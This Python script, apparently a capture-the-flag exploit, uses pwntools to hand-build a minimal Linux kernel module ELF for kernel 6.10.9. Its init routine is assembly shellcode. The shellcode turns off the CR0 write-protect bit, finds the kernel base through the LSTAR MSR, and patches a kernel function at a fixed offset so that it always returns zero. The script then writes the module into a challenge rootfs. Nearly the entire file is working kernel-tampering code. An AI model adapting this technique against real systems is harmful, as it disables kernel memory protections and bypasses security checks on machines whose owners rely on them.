from pwnc.minelf import ELF
from pwn import context, asm, p64
from ctypes import sizeof
import argparse

parser = argparse.ArgumentParser("patch")
parser.add_argument("file")
args = parser.parse_args()

SHT_PROGBITS = 1
SHT_SYMTAB = 2
SHT_STRTAB = 3
SHT_RELA = 4
R_X86_64_64 = 1
SHF_WRITE = 1
SHF_ALLOC = 2
SHF_EXECINSTR = 4
context.arch = "amd64"

rng_elf_bytes = open("./rng-core.ko", "rb").read()
rng = ELF(rng_elf_bytes)

elf = ELF(b"")
elf.raw_elf_bytes += rng.header

elf.header.section_offset = sizeof(elf.Header)

# SHT_NULL
# section names
# SHT_SYMTAB
# SHT_STRTAB
# this_module
# this_module rela
# .text

sections = []

null = elf.Section()
names = elf.Section()
symtab = elf.Section()
strtab = elf.Section()
this_module = elf.Section()
this_module_rela = elf.Section()
text = elf.Section()
modinfo = elf.Section()

sections = [null, names, symtab, strtab, this_module, this_module_rela, text, modinfo]
elf.header.number_of_sections = len(sections)
elf.header.section_name_table_index = 1

null.bname = b""

names.bname = b"sname"
names.type = SHT_STRTAB

symtab.bname = b"symtab"
symtab.type = SHT_SYMTAB
symtab.link = 3
symtab.entrysize = sizeof(elf.Symbol)
symtab.info = 2

init_module = elf.Symbol()
init_module.name = 1
init_module.section_index = 6
init_module.value = 0
init_module.info = 0x10

symtab.content = b"" + elf.Symbol() + init_module

strtab.bname = b"strtab"
strtab.type = SHT_STRTAB
strtab.content = b"\x00init_module\x00"

this_module.bname = b".gnu.linkonce.this_module"
this_module.type = SHT_PROGBITS
this_module.flags = SHF_ALLOC | SHF_WRITE
this_module.content = rng.section_content(rng.section_from_name(b".gnu.linkonce.this_module"))
this_module.content[0x18:0x20] = b"MEOW".ljust(8, b"\x00")

this_module_rela.bname = b"tmr"
this_module_rela.type = SHT_RELA
this_module_rela.link = 2
this_module_rela.info = 4
this_module_rela.entrysize = sizeof(elf.Reloca)
this_module_rela.content = bytearray()

init_module_rela = elf.Reloca()
init_module_rela.offset = 0x138
init_module_rela.sym = 1
init_module_rela.type = R_X86_64_64

this_module_rela.content = b""
this_module_rela.content += init_module_rela

text.bname = b"text"
text.type = SHT_PROGBITS
text.flags = SHF_ALLOC | SHF_EXECINSTR
text.content = asm(
"""
    push rax
    push rbx
    push rcx
    push rdx
    push rbp

    mov rax, cr0
    and rax, ~(1 << 16)
    mov cr0, rax

    mov ecx, 0xc0000082
    rdmsr

    shl rdx, 32
    or rax, rdx
    mov rbp, rax

    lea rdx, [rbp - 0x53e5a0]
    mov dword ptr [rdx], 0xc3c031

    pop rbp
    pop rdx
    pop rcx
    pop rbx
    pop rax
    ret
""")

modinfo.bname = b".modinfo"
modinfo.type = SHT_PROGBITS
modinfo.flags = SHF_ALLOC
modinfo.content = \
b"""vermagic=6.10.9 SMP preempt mod_unload \x00license=\x00"""

name_content = b""
for section in sections:
    section.name = len(name_content)
    name_content += section.bname + b"\x00"
names.content = name_content

total = b""
for section in sections:
    total += section
elf = ELF(elf.raw_elf_bytes + total)

total = b""
for i, section in enumerate(sections):
    if hasattr(section, "content"):
        elf.sections[i].offset = len(elf.raw_elf_bytes) + len(total)
        elf.sections[i].size = len(section.content)

        total += section.content

elf = ELF(elf.raw_elf_bytes + total)
print(f"{len(elf.raw_elf_bytes) = :#x}")

with open("app/rootfs/patch.ko", "wb+") as fp:
    fp.write(elf.raw_elf_bytes)
with open("driver.ko", "wb+") as fp:
    fp.write(elf.raw_elf_bytes)
with open("driver.ko.len", "wb+") as fp:
    fp.write(p64(len(elf.raw_elf_bytes)))